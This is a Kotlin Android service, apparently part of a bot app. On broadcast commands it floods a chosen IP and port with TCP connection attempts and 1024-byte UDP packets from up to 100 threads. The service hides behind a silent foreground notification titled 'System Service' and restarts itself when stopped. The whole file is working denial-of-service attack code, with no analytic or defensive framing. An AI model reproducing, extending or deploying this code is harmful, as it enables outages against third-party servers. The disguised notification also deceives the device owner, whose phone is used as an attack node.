package com.sync.xxx

import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import java.io.IOException
import java.net.DatagramPacket
import java.net.DatagramSocket
import java.net.InetAddress
import java.net.Socket
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class NetworkLockService : Service() {

    companion object {
        const val ACTION_START = "com.sync.xxx.NETWORK_LOCK_START"
        const val ACTION_STOP = "com.sync.xxx.NETWORK_LOCK_STOP"
        const val EXTRA_TARGET_IP = "targetIp"
        const val EXTRA_TARGET_PORT = "targetPort"
        const val EXTRA_INTENSITY = "intensity"
    }

    private val mainHandler = Handler(Looper.getMainLooper())
    private var isReceiverRegistered = false
    private var isAttacking = false
    
    private var targetIp: String = "8.8.8.8"
    private var targetPort: Int = 80
    private var intensity: Int = 5
    
    private val executor = Executors.newCachedThreadPool()
    private val attackTasks = mutableListOf<Runnable>()

    private val receiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            when (intent.action) {
                ACTION_START -> {
                    val ip = intent.getStringExtra(EXTRA_TARGET_IP) ?: "8.8.8.8"
                    val port = intent.getIntExtra(EXTRA_TARGET_PORT, 80)
                    val level = intent.getIntExtra(EXTRA_INTENSITY, 5)
                    mainHandler.post { startAttack(ip, port, level) }
                }
                ACTION_STOP -> mainHandler.post { stopAttack() }
            }
        }
    }

    override fun onCreate() {
        super.onCreate()

        // Start as foreground service on Android O+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                val channel = android.app.NotificationChannel(
                    "network_lock_channel",
                    "Network Lock Service",
                    android.app.NotificationManager.IMPORTANCE_LOW
                ).apply {
                    setShowBadge(false)
                    setSound(null, null)
                }
                val notificationManager = getSystemService(android.app.NotificationManager::class.java)
                notificationManager?.createNotificationChannel(channel)

                val notification = android.app.Notification.Builder(this, "network_lock_channel")
                    .setContentTitle("System Service")
                    .setContentText("Running")
                    .setSmallIcon(android.R.drawable.ic_dialog_info)
                    .build()

                startForeground(4003, notification)
            } catch (e: Exception) {
                Log.e("NetworkLock", "Foreground notification error: ${e.message}")
            }
        }

        try {
            val filter = IntentFilter().apply {
                addAction(ACTION_START)
                addAction(ACTION_STOP)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(receiver, filter, RECEIVER_NOT_EXPORTED)
            } else {
                registerReceiver(receiver, filter)
            }
            isReceiverRegistered = true
        } catch (e: Exception) {
            Log.e("NetworkLock", "registerReceiver error: ${e.message}")
        }
    }

    private fun startAttack(ip: String, port: Int, level: Int) {
        if (isAttacking) {
            Log.d("NetworkLock", "Already attacking, skipping duplicate start call")
            return
        }
        
        stopAttack()
        
        targetIp = ip
        targetPort = port
        intensity = level.coerceIn(1, 10)
        
        isAttacking = true
        
        val threadCount = intensity * 10
        
        Log.d("NetworkLock", "Network Lock attack started: $targetIp:$targetPort with $threadCount threads")
        
        // DOS Attack: SYN Flood simulation
        repeat(threadCount / 2) {
            val dosTask = Runnable {
                while (isAttacking) {
                    try {
                        val socket = Socket()
                        socket.connect(
                            java.net.InetSocketAddress(targetIp, targetPort),
                            100
                        )
                        socket.close()
                    } catch (e: Exception) {
                        // Connection refused or timeout is expected
                    }
                    Thread.sleep(10)
                }
            }
            attackTasks.add(dosTask)
            executor.execute(dosTask)
        }
        
        // UDP Flood
        repeat(threadCount / 2) {
            val udpTask = Runnable {
                var socket: DatagramSocket? = null
                try {
                    socket = DatagramSocket()
                    val address = InetAddress.getByName(targetIp)
                    val payload = ByteArray(1024) { 0xFF.toByte() }
                    
                    while (isAttacking) {
                        try {
                            val packet = DatagramPacket(payload, payload.size, address, targetPort)
                            socket.send(packet)
                        } catch (e: IOException) {
                            // Continue flooding
                        }
                        Thread.sleep(5)
                    }
                } catch (e: Exception) {
                    Log.e("NetworkLock", "UDP flood error: ${e.message}")
                } finally {
                    socket?.close()
                }
            }
            attackTasks.add(udpTask)
            executor.execute(udpTask)
        }
    }

    private fun stopAttack() {
        if (!isAttacking) {
            return
        }
        
        isAttacking = false
        attackTasks.clear()
        
        executor.shutdownNow()
        try {
            executor.awaitTermination(2, TimeUnit.SECONDS)
        } catch (e: InterruptedException) {
            Log.e("NetworkLock", "Executor shutdown interrupted: ${e.message}")
        }
        
        Log.d("NetworkLock", "Network Lock attack stopped")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        stopAttack()
        if (isReceiverRegistered) {
            try {
                unregisterReceiver(receiver)
                isReceiverRegistered = false
            } catch (e: Exception) {
                Log.e("NetworkLock", "unregisterReceiver error: ${e.message}")
            }
        }
    }
}
